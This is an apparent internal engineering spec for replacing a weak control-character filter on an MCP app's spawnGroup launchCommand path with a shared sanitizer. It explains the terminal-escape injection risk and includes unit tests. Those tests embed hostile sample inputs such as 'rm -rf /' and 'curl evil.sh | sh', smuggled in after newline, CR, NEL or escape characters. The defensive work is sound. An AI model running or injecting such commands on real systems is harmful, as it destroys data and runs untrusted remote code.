# SPEC-W1-B — spawnGroup control-char sanitizer

**Wave:** 1 · **Priority:** P0 · **Source findings:** F5 · **Type:** MAIN/security · **Repos/zones:** `src/main/mcpLifecycle.ts` · `src/main/dispatchSanitize.ts` · `src/main/mcpLifecycle.test.ts`

---

## 1. Problem

**F5 (MED — Security/Correctness):** `mcpLifecycle.ts` line 155 uses a hand-rolled inline sanitizer for the `spawnGroup` `launchCommand` field:

```ts
const launchClean = Array.from(rawSrc)
  .filter((c) => c >= ' ')   // SPACE = U+0020; comparison is by Unicode code point
  .join('')
  .trim()
  .slice(0, 400)
```

The predicate `c >= ' '` retains every code point whose Unicode scalar value is ≥ 0x20. This **passes two classes of dangerous characters**:

| Class | Code points | Risk |
|---|---|---|
| **DEL** | U+007F | ASCII delete; used in certain terminal-escape sequences |
| **C1 controls** | U+0080–U+009F | 8-bit encodings of CSI (`U+009B`), OSC (`U+009D`), DCS, NEL (`U+0085`), etc. — the exact characters a terminal interprets as escape-sequence openers |

An attacker (or a misbehaving agent, since `spawn_group` will be MCP-tier-gated but the Command-board already calls `spawnGroup` over IPC today) who controls the `launchCommand` value can embed a C1 CSI sequence that resets the terminal, changes the title, or injects additional PTY commands *before* the human sees any output — a **terminal-escape injection** on the PTY write path.

**Why it is LIVE today:** The Command board (`useMcpCommands.ts`) dispatches a `spawnGroup` IPC call with a user-supplied `launchCommand` today (no MCP wiring required). Every call funnels through `createMcpLifecycle.spawnGroup`, which writes `launchCommand` as the first PTY line via `registry.sendCommand({ type: 'spawnGroup', members: { terminal: { launchCommand } } })`. The weak inline filter is the *only* sanitization on that code path right now.

**The gap vs the centralized gate:** Every *dispatch-time* PTY write (handoff/assign/relay) passes `runGatedWrite` in `mcpOrchestrator.ts` (line 240), which calls the fully correct `sanitizeDispatchText` from `dispatchSanitize.ts` (line 31). That function:

- Rejects embedded CR/LF (throws `DispatchPayloadError`)
- Strips all C0 controls (U+0000–U+001F), DEL (U+007F), **and C1 controls (U+0080–U+009F)**
- Is covered by a comprehensive adversarial unit-test suite (`dispatchSanitize.test.ts`)

`configureBoard`'s `launchCommand` path in `mcpOrchestrator.ts` (line 472) also calls `sanitizeDispatchText` correctly. **Only the `spawnGroup` path in `mcpLifecycle.ts` uses the weaker inline predicate** — creating two divergent sanitization rules for the same category of exec-vector input.

---

## 2. Goal & non-goals

**Goal:** Replace the inline `c >= ' '` filter in `spawnGroup` with a call to `sanitizeDispatchText` so there is **one sanitization rule** for all launchCommand/exec-vector inputs across the codebase, and DEL + C1 are reliably stripped.

**Non-goals:**

- **Wire-registering `spawn_group` as an MCP tool** — that is a separate slice (W1-G / F12 / C2). This spec ships the sanitizer fix independently of wiring, exactly as the audit mandates: *"the sanitizer fix is load-bearing and must ship regardless of wiring"*.
- Changing the `launchCommand` length cap (400 chars), whitespace-collapse, or trim logic — those are correct and stay.
- Touching `configureBoard`, `runGatedWrite`, or `dispatchSanitize.ts` — the dispatch path is already correct; this spec only fixes the `spawnGroup` path to match it.

---

## 3. Design

### Character predicate

Replace `Array.from(rawSrc).filter((c) => c >= ' ')` with a call to the existing `sanitizeDispatchText` from `dispatchSanitize.ts`. The correct predicate (already implemented and tested there) is:

```
keep ch  iff  codePoint(ch) > 0x1F  AND  codePoint(ch) ≠ 0x7F  AND  NOT (0x80 ≤ codePoint(ch) ≤ 0x9F)
```

This is already expressed as:
```ts
if (code <= 0x1f || code === 0x7f || (code >= 0x80 && code <= 0x9f)) continue
```
in `dispatchSanitize.ts` lines 42-43.

### Strip vs reject

`sanitizeDispatchText` **rejects** on embedded CR/LF (throws `DispatchPayloadError`) and **strips** other control chars. For `spawnGroup`:

- The **reject-on-newline** behaviour is correct and desired — the `spawnGroup` comment at line 152–153 already documents *"strip control chars (CR/LF would inject extra PTY lines — the exec-vector class)"*. `DispatchPayloadError` should propagate to the caller as a tool/IPC error so the Command board or future MCP tool surfaces it rather than silently swallowing a malformed input.
- The **strip** behaviour for all other controls (including DEL + C1) is the right choice — silent strip is consistent with the existing `spawnGroup` contract (empty launchCommand → bare shell) and does not require callers to change.

### Shared helper — one rule, not two

`dispatchSanitize.ts` already IS the shared helper. The fix is an **import + call-site change** in `mcpLifecycle.ts`, not a new abstraction. Both paths (`spawnGroup` here, `configureBoard`/`runGatedWrite` in `mcpOrchestrator.ts`) will then import from the same module and use the identical predicate.

No new files needed.

---

## 4. Implementation plan

### Step 1 — Import `sanitizeDispatchText` in `mcpLifecycle.ts`

Add to the imports at the top of `src/main/mcpLifecycle.ts`:

```ts
import { DispatchPayloadError, sanitizeDispatchText } from './dispatchSanitize'
```

### Step 2 — Replace the inline filter (lines 154–159)

**Remove:**
```ts
const rawSrc = typeof input.launchCommand === 'string' ? input.launchCommand : ''
const launchClean = Array.from(rawSrc)
  .filter((c) => c >= ' ')
  .join('')
  .trim()
  .slice(0, 400)
const launchCommand = launchClean || undefined
```

**Replace with:**
```ts
const rawSrc = typeof input.launchCommand === 'string' ? input.launchCommand : ''
let launchCommand: string | undefined
if (rawSrc) {
  // 🔒 F5: use the centralized sanitizer (strip C0/DEL/C1; reject embedded CR/LF) so
  // spawnGroup and the configureBoard/runGatedWrite dispatch path share ONE sanitization rule.
  // DispatchPayloadError propagates: a multiline launchCommand is rejected, not silently split.
  const clean = sanitizeDispatchText(rawSrc).trim().slice(0, 400)
  launchCommand = clean || undefined
}
```

`DispatchPayloadError` is intentionally not caught here — it should propagate to the IPC handler / MCP tool layer so the caller gets a meaningful error rather than a silently-stripped empty launchCommand.

### Step 3 — No other files need changing

`mcpOrchestrator.ts`, `dispatchSanitize.ts`, and the renderer are untouched. The `SpawnGroupInput` type in `mcpLifecycle.ts` is unchanged (still `launchCommand?: string`).

---

## 5. Schema / migration impact

None. `launchCommand` is an in-flight IPC/MCP argument, not a persisted field. No `schemaVersion` bump, no migration, no `minReaderVersion` change.

---

## 6. Tests

Add a new `describe` block to `src/main/mcpLifecycle.test.ts`, directly below the existing `createMcpLifecycle.spawnGroup` block. Name it to reference F5 explicitly so the regression is trackable.

```ts
describe('🔒 F5: spawnGroup launchCommand sanitizer (DEL + C1 escape-injection fix)', () => {
  // Re-use the recordingReg / makeLife helpers from the sibling describe block above.

  it('strips DEL (0x7F) from a launchCommand — was passed by the old c >= " " filter', async () => {
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await life.spawnGroup({ name: 'zone', launchCommand: 'claude\x7f --dangerously-skip-permissions' })
    const lc = (sent[0].members as { terminal: { launchCommand?: string } }).terminal.launchCommand
    expect(lc).toBe('claude --dangerously-skip-permissions')
  })

  it('strips C1 CSI (U+009B) — 8-bit terminal escape-sequence opener', async () => {
    const csi = String.fromCodePoint(0x9b)
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await life.spawnGroup({ name: 'zone', launchCommand: `claude${csi}[2J` })
    const lc = (sent[0].members as { terminal: { launchCommand?: string } }).terminal.launchCommand
    expect(lc).toBe('claude[2J')
  })

  it('strips C1 NEL (U+0085) — newline-equivalent in 8-bit terminals', async () => {
    const nel = String.fromCodePoint(0x85)
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await life.spawnGroup({ name: 'zone', launchCommand: `claude${nel}rm -rf /` })
    // NEL stripped, not treated as a line break that injects a second command.
    const lc = (sent[0].members as { terminal: { launchCommand?: string } }).terminal.launchCommand
    expect(lc).toBe('clauderm -rf /')
  })

  it('strips the full C1 range U+0080–U+009F (all 32 code points)', async () => {
    let payload = 'cmd'
    for (let cp = 0x80; cp <= 0x9f; cp++) payload += String.fromCodePoint(cp)
    payload += 'suffix'
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await life.spawnGroup({ name: 'zone', launchCommand: payload })
    const lc = (sent[0].members as { terminal: { launchCommand?: string } }).terminal.launchCommand
    expect(lc).toBe('cmdsuffix')
  })

  it('strips bare ESC (U+001B) — C0 terminal-escape opener', async () => {
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await life.spawnGroup({ name: 'zone', launchCommand: 'claude\x1b[1;31mmalicious' })
    const lc = (sent[0].members as { terminal: { launchCommand?: string } }).terminal.launchCommand
    expect(lc).toBe('claude[1;31mmalicious')
  })

  it('rejects a launchCommand with an embedded LF (DispatchPayloadError — multi-line injection)', async () => {
    const { registry, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await expect(
      life.spawnGroup({ name: 'zone', launchCommand: 'claude\nrm -rf /' })
    ).rejects.toThrow(/newline|CR|LF/i)
  })

  it('rejects a launchCommand with an embedded CR (PTY line-submit injection)', async () => {
    const { registry, boards } = recordingReg()
    const life = makeLife(registry, boards)
    await expect(
      life.spawnGroup({ name: 'zone', launchCommand: 'claude\rcurl evil.sh | sh' })
    ).rejects.toThrow(/newline|CR|LF/i)
  })

  it('leaves printable non-ASCII above U+009F intact (legitimate chars must survive)', async () => {
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    // U+00A0 = NBSP (first code point above C1 range), accented chars
    const input = 'café  --flag'
    await life.spawnGroup({ name: 'zone', launchCommand: input })
    const lc = (sent[0].members as { terminal: { launchCommand?: string } }).terminal.launchCommand
    expect(lc).toBe(input)
  })

  it('leaves launchCommand undefined when the sanitized result is empty', async () => {
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry, boards)
    // A string of only C1 characters sanitizes to '' → should be omitted from the envelope.
    const allC1 = Array.from({ length: 32 }, (_, i) => String.fromCodePoint(0x80 + i)).join('')
    await life.spawnGroup({ name: 'zone', launchCommand: allC1 })
    const terminal = (sent[0].members as { terminal: { launchCommand?: string } }).terminal
    expect(terminal.launchCommand).toBeUndefined()
  })
})
```

These tests live alongside the existing `spawnGroup` tests in `mcpLifecycle.test.ts` and use the same `recordingReg`/`makeLife` helpers already defined in that file.

---

## 7. Acceptance criteria

- [ ] `src/main/mcpLifecycle.ts` imports `sanitizeDispatchText` (and `DispatchPayloadError`) from `./dispatchSanitize`; the `c >= ' '` inline filter is gone.
- [ ] A `launchCommand` containing DEL (U+007F) is stripped before reaching the PTY.
- [ ] A `launchCommand` containing any C1 code point (U+0080–U+009F) is stripped before reaching the PTY.
- [ ] A `launchCommand` containing an embedded CR or LF causes `spawnGroup` to throw (propagates `DispatchPayloadError` to the caller).
- [ ] A `launchCommand` that reduces to an empty string after sanitization results in `launchCommand: undefined` in the `spawnGroup` envelope (bare shell — existing contract).
- [ ] Printable non-ASCII code points above U+009F (accented chars, NBSP, etc.) are passed through unchanged.
- [ ] All tests in the F5 describe block pass under `pnpm vitest run src/main/mcpLifecycle.test.ts`.
- [ ] All existing `createMcpLifecycle.spawnGroup` tests continue to pass (no regression).
- [ ] `pnpm typecheck` passes (no new type errors).
- [ ] `pnpm lint` passes.

---

## 8. Risks & invariants

**Must not break legitimate launchCommand values.** The most common values are single-word CLI names like `claude`, `codex`, `aider`, or short flagged forms like `claude --dangerously-skip-permissions`. None of these contain DEL or C1 code points. The only breaking change for callers is that an embedded CR/LF now throws rather than being silently stripped — which is the *correct* behavior (the old filter silently collapsed `claude\nrm -rf /` to `clauderm -rf /`, hiding the injection; the new behavior makes the malformed input visible as an error).

**One sanitization rule, not two.** After this change, every exec-vector input in MAIN (`launchCommand` via `spawnGroup`, `launchCommand` via `configureBoard`, all dispatch text via `runGatedWrite`) passes through `sanitizeDispatchText`. If the rule ever needs to change (e.g. to handle a new terminal's escape encoding), the change is made in one place.

**MAIN-only change.** The renderer never sees the sanitized value; it receives the already-sanitized `launchCommand` in the `spawnGroup` IPC envelope. The `SpawnGroupInput` type accepted from the renderer/IPC does not change.

**No new attack surface.** This change only tightens validation; it adds no new IPC handlers, no new tool registrations, and no new MCP surface.

---

## 9. Handoff / sequencing

**Ship this independently.** This fix has zero dependencies — it requires no package changes, no IPC additions, no renderer changes, and no schema bump. It must NOT be blocked on, or coupled to:

- W1-G (`spawn_group` MCP wire-registration, F12/C2) — wiring can land in a later PR
- Any other Wave 1 spec

The recommended sequence within Wave 1 is to land this fix (SPEC-W1-B) in its own commit/PR alongside the other standalone MAIN fixes (F6 deny-label, F7 config audit) that similarly require no package coordination. The coordinated sibling-package + app release (C1/C2/C3/F11 bundle) can follow independently.

**Test gate:** `pnpm typecheck && pnpm lint && pnpm vitest run src/main/mcpLifecycle.test.ts src/main/dispatchSanitize.test.ts` must be green before the PR is opened. No e2e change needed (this is a MAIN-only sanitizer with full unit coverage of all adversarial inputs).
